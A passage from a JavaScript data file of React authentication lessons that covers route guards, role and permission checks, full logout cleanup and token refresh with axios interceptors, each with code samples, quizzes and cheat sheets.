        ["CSRF risk", "No", "No", "Yes (use SameSite)"]
      ]},
      cheat: [
        "localStorage = readable by any script",
        "Memory = safe from theft, lost on reload",
        "httpOnly cookie = JS can't read, browser auto-sends",
        "Cookie flags: `HttpOnly; Secure; SameSite=Strict`",
        "Pattern: access token in memory + refresh in httpOnly cookie",
        "`credentials: 'include'` to send cookies cross-origin",
        "XSS can still act as the user; prevent XSS first"
      ]
    },
    related: ["AUTH-004", "AUTH-010", "AUTH-014", "SEC-008"]
  },

  "AUTH-006": {
    tldr: "Guard private pages by checking auth state **before** they render. Auth has three states: **checking**, **guest**, **user**. With a data router, a parent route `loader` waits for the session, then `redirect`s guests to login.",
    analogy: { icon: "📒", text: "A notes app on a shared tablet: it shows a spinner while it checks your fingerprint, sends strangers to the lock screen, and opens your notes only once it's sure it's you." },
    visual: { type: "flow", title: "Visiting /notes", steps: [
      { label: "Click link", detail: "User goes to `/notes`. The router matches the protected parent route." },
      { label: "Loader runs", detail: "`requireUser` runs before any page renders: no flash of private content." },
      { label: "Wait for session", detail: "Status is **checking** on first load; wait for `/refresh` to finish." },
      { label: "Guest?", detail: "`throw redirect('/login?from=/notes')`. The page never renders." },
      { label: "User", detail: "Loader returns `{ user }`; the layout and `/notes` render." }
    ]},
    points: [
      "Never decide while status is **checking**; otherwise a reload kicks logged-in users to login.",
      "Put the guard on **one** pathless parent route; every child is protected automatically.",
      "Child loaders run **in parallel** with the parent's, so protected data must also be checked by the API (or each loader).",
      "Component guards with `<Navigate>` (ROUTE-016) work too; loaders guard **before** render, so private UI never flashes.",
      "After login/logout call `router.revalidate()` or navigate, so loaders re-run with the new state."
    ],
    code: { file: "router.jsx", lang: "jsx", src: `import { createBrowserRouter, RouterProvider, redirect, Outlet, useLoaderData } from 'react-router';
import { authStore } from './authStore';
import LoginPage from './LoginPage';

// Runs BEFORE any protected page renders
async function requireUser({ request }) {
  const user = await authStore.ready();   // waits while status is 'checking'
  if (!user) {
    const from = new URL(request.url).pathname;
    throw redirect(\`/login?from=\${encodeURIComponent(from)}\`);
  }
  return { user };
}

function PrivateLayout() {
  const { user } = useLoaderData();
  return (
    <>
      <header>📒 {user.name}'s notes</header>
      <Outlet />
    </>
  );
}

const router = createBrowserRouter([
  { path: '/', element: <h1>Welcome to Notes</h1> },
  { path: '/login', element: <LoginPage /> },
  {
    loader: requireUser,          // one guard for every child route
    hydrateFallbackElement: <p>Checking session…</p>,
    element: <PrivateLayout />,
    children: [
      { path: 'notes', element: <h1>All notes</h1> },
      { path: 'settings', element: <h1>Settings</h1> },
    ],
  },
]);

export default function App() {
  return <RouterProvider router={router} />;
}`, walk: [
      { lines: [7], note: "`authStore` is a plain module (not React state), so loaders can read it. `ready()` resolves once the session check ends." },
      { lines: [8, 9, 10], note: "Guest: remember where they were going and **throw** a redirect response." },
      { lines: [12], note: "User: hand the user to the layout through loader data." },
      { lines: [16], note: "`useLoaderData()` reads what the loader returned." },
      { lines: [28, 29, 31], note: "A pathless parent with a loader guards all children: `/notes` and `/settings`." },
      { lines: [30], note: "Shown on first page load while the loader waits (status **checking**)." }
    ]},
    output: "Logged out → visiting `/settings` lands on `/login?from=%2Fsettings` with no flicker. Logged in → the header shows \"📒 Asha's notes\" above the page.",
    mistakes: [
      { bad: `const { user } = useAuth();\nif (!user) return <Navigate to="/login" />;\n// user is null while the session check runs`, good: `const { user, status } = useAuth();\nif (status === 'checking') return <Spinner />;\nif (!user) return <Navigate to="/login" replace />;`, why: "On reload the user is briefly unknown. Treating \"unknown\" as \"guest\" logs everyone out on refresh." },
      { bad: `// Only the parent loader checks auth\n{ path: 'notes', loader: () => fetch('/api/notes') }`, good: `// API returns 401 for guests, so data stays private\n{ path: 'notes', loader: () => api('/api/notes') }`, why: "Parent and child loaders run in parallel; the child fetch starts before the parent redirects. The server must protect the data." }
    ],
    practice: [
      { level: "B", q: "Add a protected `/notes/:id` route.", a: "Add `{ path: 'notes/:id', element: <Note /> }` to the guarded parent's `children`." },
      { level: "I", q: "Write a `guestOnly` loader that sends logged-in users away from `/login`.", a: "Mirror the guard.", code: `async function guestOnly() {\n  const user = await authStore.ready();\n  if (user) throw redirect('/notes');\n  return null;\n}\n// { path: '/login', loader: guestOnly, element: <LoginPage /> }` },
      { level: "I", q: "In `LoginPage`, go back to `from` after logging in.", a: "Read it with `useSearchParams()`, then `navigate(safeRedirect(from, '/notes'), { replace: true })`. A plain `startsWith('/')` check lets `//evil.example` through (AUTH-015)." },
      { level: "C", q: "After logout, a user presses Back and sees `/notes` again. Fix it.", a: "Call `router.revalidate()` (or navigate) after clearing auth so the guard re-runs and redirects; also clear cached data (AUTH-009)." }
    ],
    quiz: [
      { q: "Why wait for `authStore.ready()` in the guard?", options: ["To speed up rendering", "So a reload doesn't treat \"still checking\" as \"logged out\"", "React Router requires it"], answer: 1, why: "On first load the session is unknown until `/refresh` answers." },
      { q: "How does a loader send a guest to login?", options: ["`navigate('/login')`", "`throw redirect('/login')`", "`return <Navigate to=\"/login\" />`"], answer: 1, why: "Loaders aren't components; they return or throw a redirect response." },
      { q: "Do child loaders wait for the parent loader to finish?", options: ["Yes, always", "No, they run in parallel"], answer: 1, why: "React Router runs matched loaders in parallel, so each data request must be protected by the API." }
    ],
    rev: {
      sec30: "Protect routes using auth state with three values: checking, guest, user. Data-router approach: a pathless parent route with a loader that awaits the session check and `throw redirect('/login?from=…')` for guests. Children are guarded automatically. Loaders run in parallel, so APIs must still enforce auth.",
      interview: [
        { level: "basic", q: "How do you protect many routes at once?", a: "Wrap them in one parent layout route that checks auth (loader or `<Navigate>` guard) and renders `<Outlet />`." },
        { level: "intermediate", q: "Why does a protected page flash or redirect on reload?", a: "The guard runs before the session is restored. Add a `checking` state and wait for it before deciding." },
        { level: "advanced", q: "Loader guard vs component guard?", a: "Loaders run before render, so private UI never flashes (child loaders still start in parallel). Component guards are simpler in declarative mode but render first." },
        { level: "tricky", q: "Is a protected route a security feature?", a: "No, it's UX. The JS bundle and routes are public; real protection is the API returning 401/403." }
      ],
      cheat: [
        "Auth status: checking | guest | user",
        "Never redirect while checking",
        "Guard once on a pathless parent route",
        "Loader: `throw redirect('/login?from=' + path)`",
        "Child loaders run in parallel: protect the API too",
        "`router.revalidate()` after login/logout",
        "Routes are UX; the server is security"
      ]
    },
    related: ["ROUTE-016", "ROUTE-017", "ROUTE-018", "AUTH-011"]
  },

  "AUTH-007": {
    tldr: "Role-based access control (RBAC) gives each user a **role** (customer, staff, admin) and decides what they see by role. In React you hide buttons with a `<RoleGate>` and guard pages with a role route; the server enforces the same rules.",
    analogy: { icon: "🛍️", text: "In a shop, shoppers see the shelves, cashiers also see the till, and the manager also has the safe key. People don't get keys one by one; their job title decides." },
    visual: { type: "tree", title: "Shop routes by role", root: { label: "App", children: [
      { label: "Public", note: "everyone", children: [ { label: "/shop" }, { label: "/product/:id" } ] },
      { label: "RequireRole staff, admin", children: [ { label: "/orders-board" }, { label: "/stock" } ] },
      { label: "RequireRole admin", children: [ { label: "/admin/users" }, { label: "/admin/billing" } ] }
    ]}},
    points: [
      "A role is a **bundle of rights** named after a job. Simple to explain and audit.",
      "Two levels: **page** guards (`<RequireRole allow={['admin']}>`) and **feature** gates (`<RoleGate>` around a button).",
      "Check `allow.includes(role)` rather than `role !== 'customer'`, so new roles are denied by default.",
      "Roles come from the server (login response or token claims). Hidden UI is not protection: the API checks the role too.",
      "When roles multiply into special cases, switch to permissions (AUTH-008)."
    ],
    code: { file: "roles.jsx", lang: "jsx", src: `import { Navigate, Outlet } from 'react-router';
import { useAuth } from './auth';

// Feature-level: show children only for allowed roles
export function RoleGate({ allow, children, fallback = null }) {
  const { user } = useAuth();
  return allow.includes(user?.role) ? children : fallback;
}

// Page-level: guard a group of routes
export function RequireRole({ allow }) {
  const { user, status } = useAuth();
  if (status === 'checking') return <p>Checking access…</p>;
  if (!user) return <Navigate to="/login" replace />;
  if (!allow.includes(user.role)) return <Navigate to="/403" replace />;
  return <Outlet />;
}

export function ProductCard({ product }) {
  return (
    <article>
      <h3>{product.name}</h3>
      <button>Add to cart</button>
      <RoleGate allow={['staff', 'admin']}>
        <button>Edit price</button>
      </RoleGate>
      <RoleGate allow={['admin']} fallback={<small>Only admins can delete</small>}>
        <button>Delete</button>
      </RoleGate>
    </article>
  );
}

// <Route element={<RequireRole allow={['admin']} />}>
//   <Route path="admin/users" element={<Users />} />
// </Route>`, walk: [
      { lines: [5, 6, 7], note: "`RoleGate` renders children for allowed roles, otherwise a fallback (or nothing)." },
      { lines: [13, 14, 15], note: "Wait while checking. No user → login (401 style). Wrong role → a 403 page, not login." },
      { lines: [24, 25, 26], note: "Staff and admins see **Edit price**; customers don't." },
      { lines: [27, 28, 29], note: "A fallback explains *why* something is missing instead of silently hiding it." },
      { lines: [34, 35, 36], note: "Wrap admin pages in one `RequireRole` layout route." }
    ]},
    output: "A customer sees \"Add to cart\" and \"Only admins can delete\". Staff also see \"Edit price\". Admins see all buttons and can open `/admin/users`.",
    mistakes: [
      { bad: `{user.role !== 'customer' && <DeleteButton />}`, good: `<RoleGate allow={['admin']}><DeleteButton /></RoleGate>`, why: "Deny lists leak access to every new role you add later (e.g. `guest`). Allow lists deny by default." },
      { bad: `if (!allow.includes(user.role)) return <Navigate to="/login" />;`, good: `if (!allow.includes(user.role)) return <Navigate to="/403" replace />;`, why: "The user is logged in. Sending them to login loops; show a \"no access\" page." }
    ],
    practice: [
      { level: "B", q: "Show an \"Admin\" link in the navbar only for admins.", a: "`<RoleGate allow={['admin']}><NavLink to=\"/admin/users\">Admin</NavLink></RoleGate>`" },
      { level: "I", q: "Write a `hasRole(user, ...roles)` helper for use in logic, not JSX.", a: "Return a boolean.", code: `export const hasRole = (user, ...roles) => roles.includes(user?.role);\n// if (hasRole(user, 'staff', 'admin')) loadStockAlerts();` },
      { level: "I", q: "Users can have **several** roles (`roles: ['staff','support']`). Update `RoleGate`.", a: "`allow.some(r => user?.roles?.includes(r))`." },
      { level: "C", q: "Role hierarchy: admin ⊃ staff ⊃ customer. Implement `atLeast('staff')`.", a: "Rank roles and compare numbers.", code: `const RANK = { customer: 1, staff: 2, admin: 3 };\nconst atLeast = (user, role) => (RANK[user?.role] ?? 0) >= RANK[role];` }
    ],
    quiz: [
      { q: "A logged-in customer opens `/admin/users`. Where should they go?", options: ["/login", "A 403 / no-access page", "/admin/users anyway"], answer: 1, why: "They're authenticated but not authorized." },
      { q: "Why `allow.includes(role)` instead of `role !== 'customer'`?", options: ["It's shorter", "Unknown or new roles are denied by default", "It's faster"], answer: 1, why: "Allow lists fail closed." },
      { q: "If the UI hides the Delete button, is the delete endpoint safe?", options: ["Yes", "No, the API must check the role"], answer: 1, why: "Anyone can send the request with curl or DevTools." }
    ],
    rev: {
      sec30: "RBAC maps users to roles and roles to features. In React: page guards (`RequireRole` layout route → login or 403) and feature gates (`RoleGate` with an allow list and optional fallback). Roles come from the server and the server re-checks them. Allow lists deny by default.",
      interview: [
        { level: "basic", q: "What is RBAC?", a: "Access control where rights are given to roles (admin, staff) and users get roles, instead of rights one by one." },
        { level: "intermediate", q: "How do you hide features by role in React?", a: "A small `RoleGate` component or `hasRole` helper reading the user from auth context; route groups use a role guard layout route." },
        { level: "advanced", q: "Where do roles come from and can the client trust them?", a: "From the login response or token claims. The client uses them for UI only; the API checks the role on every request." },
        { level: "tricky", q: "When does RBAC stop scaling?", a: "When you need \"edit only your own notes\" or many one-off exceptions: role explosion. Move to permissions or ownership checks." }
      ],
      cheat: [
        "RBAC: user → role → allowed features",
        "Page guard: `<RequireRole allow={[...]}>` + `<Outlet />`",
        "Feature gate: `<RoleGate allow={[...]} fallback={...}>`",
        "Allow list, deny by default",
        "Wrong role → 403 page, not login",
        "Server re-checks every request"
      ]
    },
    related: ["AUTH-001", "AUTH-008", "AUTH-012", "ROUTE-016"]
  },

  "AUTH-008": {
    tldr: "Permission-based access checks **specific actions** (`notes:edit`, `orders:refund`) instead of job titles. The server sends the user's permissions; a `can(user, action, item)` helper also handles rules like \"only your own notes\".",
    analogy: { icon: "🍳", text: "In a shared recipe app, being a \"member\" isn't enough detail. You can read every recipe, edit only your own, and a moderator can delete any. Each action is its own tick box." },
    visual: { type: "flow", title: "Can Asha edit this note?", steps: [
      { label: "Server sends perms", detail: "`permissions: ['notes:read', 'notes:edit:own']`" },
      { label: "Ask an action", detail: "UI asks `can(user, 'notes:edit', note)`." },
      { label: "Global perm?", detail: "Has `notes:edit` (any note)? No." },
      { label: "Own perm + owner?", detail: "Has `notes:edit:own` and `note.ownerId === user.id`? Yes." },
      { label: "Show Edit", detail: "Render the button. The API repeats the same check on save." }
    ]},
    points: [
      "Roles answer *who you are at work*; permissions answer *what exactly you can do*. Often roles are just bundles of permissions on the server.",
      "Name permissions `resource:action` (`orders:refund`). Check permissions in UI code, never role names, so roles can change freely.",
      "**Ownership** (`ownerId === user.id`) is a permission rule too; it needs the item, not just the user.",
      "Hide what users can never do; **disable** with a hint when they could do it in a different state.",
      "One `can()` function used everywhere keeps rules consistent and testable."
    ],
    code: { file: "permissions.jsx", lang: "jsx", src: `import { useAuth } from './auth';

// From the server with the user:
// { id: 7, role: 'member', permissions: ['notes:read', 'notes:edit:own'] }

export function can(user, action, item) {
  const perms = user?.permissions ?? [];
  if (perms.includes(action)) return true;              // any item
  if (perms.includes(\`\${action}:own\`) && item?.ownerId === user.id) return true;
  return false;                                         // deny by default
}

export function Can({ do: action, on, children, fallback = null }) {
  const { user } = useAuth();
  return can(user, action, on) ? children : fallback;
}

export function NoteCard({ note }) {
  const { user } = useAuth();
  return (
    <article>
      <p>{note.text}</p>
      <Can do="notes:edit" on={note}>
        <button>Edit</button>
      </Can>
      <Can do="notes:delete" on={note} fallback={<small>Read only</small>}>
        <button>Delete</button>
      </Can>
      <button disabled={!can(user, 'notes:share', note)} title="Ask the owner to share">
        Share
      </button>
    </article>
  );
}`, walk: [
      { lines: [4], note: "The server decides the list; the client just reads it." },
      { lines: [8], note: "A global permission covers every item." },
      { lines: [9], note: "An `:own` permission only counts when the user owns this item." },
      { lines: [13, 14, 15, 16], note: "`<Can>` wraps the helper for JSX. `do` is fine as a prop name; rename it while destructuring." },
      { lines: [23, 24, 25], note: "Asha sees **Edit** on her notes only." },
      { lines: [29], note: "Disable (with a hint) when hiding would confuse; still checked server-side." }
    ]},
    output: "On Asha's own note: Edit button, \"Read only\", disabled Share. On someone else's note: just \"Read only\" and disabled Share.",
    mistakes: [
      { bad: `{user.role === 'moderator' && <DeleteButton />}`, good: `<Can do="notes:delete" on={note}><DeleteButton /></Can>`, why: "Role checks scattered in JSX break when roles change. Ask for the permission; the server maps roles to permissions." },
      { bad: `can(user, 'notes:edit')  // no item passed`, good: `can(user, 'notes:edit', note)`, why: "Ownership rules need the item. Without it, `:own` permissions always fail." }
    ],
    practice: [
      { level: "B", q: "Give moderators `notes:delete`. What changes in React?", a: "Nothing: the server adds the permission to moderators' lists, and `<Can do=\"notes:delete\">` starts showing the button." },
      { level: "I", q: "Write tests for `can` with Vitest.", a: "Pure function, so test the table of cases.", code: `test('own permission needs ownership', () => {\n  const user = { id: 7, permissions: ['notes:edit:own'] };\n  expect(can(user, 'notes:edit', { ownerId: 7 })).toBe(true);\n  expect(can(user, 'notes:edit', { ownerId: 8 })).toBe(false);\n});` },
      { level: "I", q: "Support a wildcard `notes:*`.", a: "Before denying, check `perms.includes(action.split(':')[0] + ':*')`." },
      { level: "C", q: "Permissions change while the user is logged in. How does the UI catch up?", a: "Refetch `/api/me` on focus or after a 403, or read permissions from each fresh access token on refresh." }
    ],
    quiz: [
      { q: "Best name for the right to refund orders?", options: ["`isManager`", "`orders:refund`", "`role === 'admin'`"], answer: 1, why: "`resource:action` names describe exactly one capability." },
      { q: "To check \"edit only your own note\", `can` needs…", options: ["Only the user", "The user and the note", "Only the note"], answer: 1, why: "Ownership compares `note.ownerId` with `user.id`." },
      { q: "A user lacks `notes:delete`. Is hiding the button enough?", options: ["Yes", "No, the API also returns 403"], answer: 1, why: "Client checks are UX; the API enforces." }
    ],
    rev: {
      sec30: "Permission-based access checks actions like `orders:refund` instead of roles. The server sends a permission list; one `can(user, action, item)` helper handles global and ownership (`:own`) rules; a `<Can>` component wraps it for JSX. Deny by default, hide or disable with hints, and the server repeats every check.",
      interview: [
        { level: "basic", q: "Roles vs permissions?", a: "A role is a job title (editor); a permission is one action (`notes:edit`). Roles are usually bundles of permissions." },
        { level: "intermediate", q: "Why check permissions in UI code instead of roles?", a: "Role-to-permission mapping can change on the server without touching React code." },
        { level: "advanced", q: "How do you handle ownership in the UI?", a: "Pass the resource into `can()` and compare `ownerId` with the user's id for `:own` permissions. The API does the same comparison with database data." },
        { level: "tricky", q: "Hide or disable a button the user can't use?", a: "Hide if they'll never be able to; disable with an explanation if another state or person could enable it, so the feature stays discoverable." }
      ],
      compare: { cols: ["", "Roles (RBAC)", "Permissions"], rows: [
        ["Unit", "Job title", "Single action"],
        ["Example", "`admin`", "`orders:refund`"],
        ["Ownership rules", "Awkward", "`notes:edit:own`"],
        ["Best for", "Few, simple tiers", "Fine-grained apps"]
      ]},
      cheat: [
        "Permission = `resource:action`",
        "`can(user, action, item)` in one place",
        "`:own` permissions compare `ownerId` with `user.id`",
        "`<Can do=\"...\" on={item} fallback={...}>`",
        "Check permissions in UI, not role names",
        "Deny by default; server re-checks"
      ]
    },
    related: ["AUTH-007", "AUTH-012", "AUTH-001", "TEST-002"]
  },

  "AUTH-009": {
    tldr: "Logout must clear **everything** tied to the user: tell the server to revoke the session, forget the token, wipe cached data and stores, update other tabs, then go to login. Missing one step leaks the last user's data.",
    analogy: { icon: "🛒", text: "Leaving a shared shop kiosk: you sign out, but also empty the basket, close your order history and clear the saved address, so the next shopper doesn't see your stuff." },
    visual: { type: "flow", title: "A complete logout", steps: [
      { label: "Tell the server", detail: "`POST /api/auth/logout`: revoke the refresh token and clear the httpOnly cookie." },
      { label: "Forget the token", detail: "Set the in-memory access token to `null`." },
      { label: "Wipe caches", detail: "`queryClient.clear()`, reset Redux/Zustand stores, clear user drafts." },
      { label: "Tell other tabs", detail: "`BroadcastChannel('auth')` → other tabs log out too." },
      { label: "Leave", detail: "`navigate('/login', { replace: true })`, so Back doesn't show private pages." }
    ]},
    points: [
      "JS **can't delete an httpOnly cookie**; only the server can (by sending an expired `Set-Cookie`).",
      "Clear local state in `finally`, so logout still works if the network call fails.",
      "Cached server data (TanStack Query, RTK Query) is the most common leak: the next user briefly sees the old orders.",
      "A JWT access token stays valid until `exp`; revoking the refresh token stops new ones, and short expiry limits the gap.",
      "Also log out on **401 after a failed refresh** and optionally after inactivity."
    ],
    code: { file: "useLogout.js", lang: "js", src: `import { useQueryClient } from '@tanstack/react-query';
import { useNavigate } from 'react-router';
import { useAuth } from './AuthProvider';
import { setAccessToken } from './tokenStore';
import { useCartStore } from './cartStore';

const channel = new BroadcastChannel('auth');

export function useLogout() {
  const { clearUser } = useAuth();
  const queryClient = useQueryClient();
  const navigate = useNavigate();

  return async function logout() {
    try {
      // Server revokes the refresh token and expires the cookie
      await fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });
    } finally {
      setAccessToken(null);               // 1. forget the token
      queryClient.clear();                // 2. drop cached server data
      useCartStore.getState().reset();    // 3. reset client stores
      sessionStorage.clear();             // 4. user-specific drafts
      clearUser();                        // 5. auth state → guest
      channel.postMessage('logout');      // 6. tell other tabs
      navigate('/login', { replace: true });
    }
  };
}

// In AuthProvider (other tabs):
// useEffect(() => {
//   channel.onmessage = (e) => { if (e.data === 'logout') clearUser(); };
//   return () => { channel.onmessage = null; };
// }, [clearUser]);`, walk: [
      { lines: [7], note: "One channel shared by every tab of the same origin." },
      { lines: [17], note: "Only the server can remove the httpOnly cookie and revoke the session." },
      { lines: [18], note: "`finally`: even offline, the local session is cleared." },
      { lines: [20, 21, 22], note: "Wipe every place user data hides: query cache, stores, storage." },
      { lines: [24, 25], note: "Broadcast to other tabs, then replace history with the login page." }
    ]},
    output: "Click Log out → lands on `/login`. Other open tabs switch to logged out. Logging in as another user shows none of the previous user's cart or orders.",
    mistakes: [
      { bad: `function logout() {\n  setUser(null);\n}`, good: `async function logout() {\n  try { await api.post('/auth/logout'); }\n  finally { setAccessToken(null); queryClient.clear(); setUser(null); }\n}`, why: "Only clearing the user leaves a valid refresh cookie and cached private data for the next person." },
      { bad: `document.cookie = 'refresh=; max-age=0';`, good: `// Server: Set-Cookie: refresh=; Max-Age=0; HttpOnly; Secure; Path=/api/auth`, why: "httpOnly cookies are invisible to JS; this line does nothing. The logout endpoint must expire it." }
    ],
    practice: [
      { level: "B", q: "Add a Log out button to the header.", a: "`const logout = useLogout();` then `<button onClick={logout}>Log out</button>`." },
      { level: "I", q: "Log the user out after 30 minutes without activity.", a: "Reset a timer on `pointerdown`/`keydown`; when it fires, call `logout()`. Clean up listeners and the timer in the effect cleanup." },
      { level: "I", q: "Why `navigate(..., { replace: true })`?", a: "So pressing Back doesn't return to the private page you were on." },
      { level: "C", q: "Logged out in tab A, but tab B still shows private orders. Fix without BroadcastChannel.", a: "Listen to the `storage` event: write a `logout` timestamp to localStorage in tab A; tab B's `storage` listener clears its state." }
    ],
    quiz: [
      { q: "How do you remove an httpOnly refresh cookie?", options: ["`document.cookie = ''`", "`localStorage.clear()`", "The server sends an expired Set-Cookie"], answer: 2, why: "JS can't see or change httpOnly cookies." },
      { q: "Why clear the TanStack Query cache on logout?", options: ["To free memory", "So the next user doesn't see the previous user's data", "It's required by React"], answer: 1, why: "Cached responses survive state changes until cleared." },
      { q: "After logout, is the old JWT access token unusable immediately?", options: ["Yes, always", "Not by itself: it's valid until `exp` unless the server keeps a deny-list"], answer: 1, why: "JWTs are stateless; keep them short-lived." }
    ],
    rev: {
      sec30: "Logout = server call (revoke refresh token, expire cookie) + local cleanup in `finally` (token → null, `queryClient.clear()`, reset stores, clear storage, user → guest) + broadcast to other tabs + `navigate('/login', { replace: true })`. JWT access tokens live until `exp`, so keep them short.",
      interview: [
        { level: "basic", q: "What must logout clear on the client?", a: "The token, the user in auth state, cached API data, client stores and any user-specific storage." },
        { level: "intermediate", q: "Why call the server on logout if the token is just in memory?", a: "To revoke the refresh token and expire the httpOnly cookie; otherwise a reload silently logs the user back in." },
        { level: "advanced", q: "How do you sync logout across tabs?", a: "`BroadcastChannel` or the `storage` event. Each tab clears its own memory and caches when it hears the message." },
        { level: "tricky", q: "User logs out, another logs in, and for a second sees old orders. Why?", a: "The query cache wasn't cleared, so stale data rendered before the refetch. Call `queryClient.clear()` on logout." }
      ],
      cheat: [
        "Server: revoke refresh token, expire cookie",
        "Client: token null, user null",
        "`queryClient.clear()` + reset stores",
        "Do local cleanup in `finally`",
        "`BroadcastChannel('auth')` for other tabs",
        "`navigate('/login', { replace: true })`",
        "JS can't delete httpOnly cookies"
      ]
    },
    related: ["AUTH-005", "AUTH-010", "STORE-022", "ROUTE-022"]
  },

  "AUTH-010": {
    tldr: "Short access tokens expire often. When an API call gets **401**, an interceptor quietly calls `/refresh` (using the httpOnly cookie), gets a new token, and **retries** the original request. Many failing calls share **one** refresh.",
    analogy: { icon: "🎢", text: "A theme-park day pass with hourly ride stamps. When your stamp runs out, a helper renews it at the booth and walks you back into the queue; you never notice. If ten friends expire together, one trip renews all." },
    visual: { type: "timeline", title: "Silent token refresh", frames: [
      { label: "09:00 login", state: "access = A (10 min), refresh cookie set", note: "Requests send `Bearer A`." },
      { label: "09:11 3 calls", state: "orders, cart, profile → 401", note: "Token A expired." },
      { label: "One refresh", state: "POST /auth/refresh → access = B", note: "The 3 failures wait on the same promise." },
      { label: "Retry", state: "orders, cart, profile → 200", note: "Each original request re-sent with `Bearer B`." },
      { label: "Refresh fails", state: "401 from /refresh → logout", note: "Cookie expired or revoked: send to login." }
    ]},
    points: [
      "Request interceptor: add `Authorization` from memory. Response interceptor: on 401, refresh once and retry.",
      "Keep **one shared refresh promise**, so parallel 401s don't fire many refreshes (with rotation, extra ones can revoke each other).",
      "Mark retried requests (`_retry`) and never refresh on the refresh call itself, or you loop forever.",
      "**Rotation**: the server issues a new refresh token each time and rejects reused ones, catching stolen tokens.",
      "If refresh fails, clear auth and send the user to login."
    ],
    code: { file: "api.js", lang: "js", src: `import axios from 'axios';

let accessToken = null;
export const setAccessToken = (t) => { accessToken = t; };

export const api = axios.create({ baseURL: '/api', withCredentials: true });

api.interceptors.request.use((config) => {
  if (accessToken) config.headers.Authorization = \`Bearer \${accessToken}\`;
  return config;
});

let refreshing = null;   // one shared refresh for many 401s

function refreshToken() {
  refreshing ??= axios
    .post('/api/auth/refresh', null, { withCredentials: true })
    .then((res) => { accessToken = res.data.accessToken; })
    .finally(() => { refreshing = null; });
  return refreshing;
}

api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config;
    if (error.response?.status !== 401 || original._retry) {
      return Promise.reject(error);
    }
    original._retry = true;
    try {
      await refreshToken();
      return api(original);            // request interceptor adds the new token
    } catch (refreshError) {
      accessToken = null;
      window.dispatchEvent(new Event('auth:logout'));
      return Promise.reject(refreshError);
    }
  }
);`, walk: [
      { lines: [8, 9, 10, 11], note: "Every request picks up the latest token from memory." },
      { lines: [13, 16], note: "`??=` starts a refresh only if none is running; others await the same promise." },
      { lines: [17], note: "Plain `axios`, not `api`, so the refresh call skips these interceptors (no loop)." },
      { lines: [27, 28, 29, 30], note: "Only handle 401s, and only once per request (`_retry`)." },
      { lines: [32, 33], note: "Wait for the refresh, then replay the original request." },
      { lines: [34, 35, 36], note: "Refresh failed: clear auth and tell the app (AuthProvider listens and goes to login)." }
    ]},
    output: "Network tab after expiry: `GET /orders 401`, `GET /cart 401`, one `POST /auth/refresh 200`, then `GET /orders 200`, `GET /cart 200`. The user sees nothing unusual.",
    mistakes: [
      { bad: `if (status === 401) {\n  await axios.post('/api/auth/refresh');\n  return api(original);\n}`, good: `if (status === 401 && !original._retry) {\n  original._retry = true;\n  await refreshToken(); // shared promise\n  return api(original);\n}`, why: "Without a shared promise, 5 parallel 401s fire 5 refreshes. Without `_retry`, a still-401 request loops forever." },
      { bad: `api.post('/auth/refresh')  // through the same interceptors`, good: `axios.post('/api/auth/refresh', null, { withCredentials: true })`, why: "If refresh itself returns 401, the interceptor tries to refresh again: infinite loop." }
    ],
    practice: [
      { level: "B", q: "Why does the refresh need `withCredentials: true`?", a: "The refresh token is an httpOnly cookie; axios only sends cookies cross-origin with `withCredentials`." },
      { level: "I", q: "Refresh **before** expiry instead of waiting for a 401.", a: "Read `exp` from the token and set a timer for ~1 minute earlier; still keep the 401 handler as a backup." },
      { level: "I", q: "Write the same logic with `fetch` (no axios).", a: "Wrap fetch.", code: `async function apiFetch(url, opts = {}, retried = false) {\n  const res = await fetch(url, { ...opts, headers: { ...opts.headers, Authorization: 'Bearer ' + accessToken } });\n  if (res.status !== 401 || retried) return res;\n  await refreshToken();\n  return apiFetch(url, opts, true);\n}` },
      { level: "C", q: "Two tabs refresh at the same moment with rotation on. One gets logged out. Why, and a fix?", a: "Tab B reused the refresh token tab A just rotated, so the server treated it as theft. Use a short reuse grace window on the server, or coordinate with `navigator.locks.request('refresh', …)`." }
    ],
    quiz: [
      { q: "Why keep one shared `refreshing` promise?", options: ["To cache API data", "So parallel 401s trigger just one refresh", "Axios requires it"], answer: 1, why: "Every waiting request reuses the same refresh result." },
      { q: "What does `original._retry = true` prevent?", options: ["Duplicate logs", "Retrying the same request forever", "CORS errors"], answer: 1, why: "A request that fails again after refresh is rejected instead of looping." },
      { q: "Refresh returns 401. What now?", options: ["Retry the refresh", "Clear auth and go to login", "Ignore it"], answer: 1, why: "The session is truly over." }
    ],
    rev: {
      sec30: "Short access token in memory + refresh token in httpOnly cookie. Request interceptor attaches the Bearer token; response interceptor catches 401, runs one shared refresh, then retries the request once (`_retry`). Refresh calls bypass the interceptor. Failed refresh → logout. Rotation issues a new refresh token each time and detects reuse.",
      interview: [
        { level: "basic", q: "Why use refresh tokens at all?", a: "So access tokens can be short-lived (small damage if stolen) without making users log in every 10 minutes." },
        { level: "intermediate", q: "How do you avoid many refresh calls when several requests fail?", a: "Store the in-flight refresh promise; every 401 awaits it, then retries with the new token." },
        { level: "advanced", q: "What is refresh token rotation?", a: "Each refresh returns a new refresh token and invalidates the old one. If an old one is reused, the server assumes theft and revokes the whole session." },
        { level: "tricky", q: "Why might the app loop forever on 401?", a: "The refresh request goes through the same interceptor, or retried requests aren't marked. Use a plain client for refresh and a `_retry` flag." }
      ],
      debug: [
        { code: `api.interceptors.response.use(r => r, async (err) => {\n  await api.post('/auth/refresh');\n  return api(err.config);\n});`, fix: `api.interceptors.response.use(r => r, async (err) => {\n  const req = err.config;\n  if (err.response?.status !== 401 || req._retry) throw err;\n  req._retry = true;\n  await refreshToken();\n  return api(req);\n});`, why: "Check the status, retry once, and refresh outside the intercepted client." }
      ],
      cheat: [
        "401 → refresh once → retry original request",
        "One shared `refreshing` promise",
        "`_retry` flag stops loops",
        "Refresh call bypasses the interceptor",
        "Refresh fails → clear auth → login",
        "Rotation: new refresh token each time, reuse = theft",
        "Optional: refresh just before `exp`"
      ]
    },
    related: ["API-018", "API-022", "AUTH-005", "AUTH-009"]
  },

  "AUTH-011": {
    tldr: "An **AuthProvider** keeps the current user, the auth status and the `login`/`logout` actions in one place and shares them through **Context**, so any component can read them without prop drilling.",
    analogy: { icon: "💬", text: "In a chat app, your profile badge, the \"new message\" button and the settings page all need to know who you are. One shared notice board (context) tells them all at once." },
    visual: { type: "tree", title: "Who reads the auth context", root: { label: "AuthProvider", note: "user, status, login, logout", children: [
      { label: "RouterProvider", children: [
        { label: "Header", note: "user.name + Log out" },
        { label: "LoginPage", note: "calls login()" },
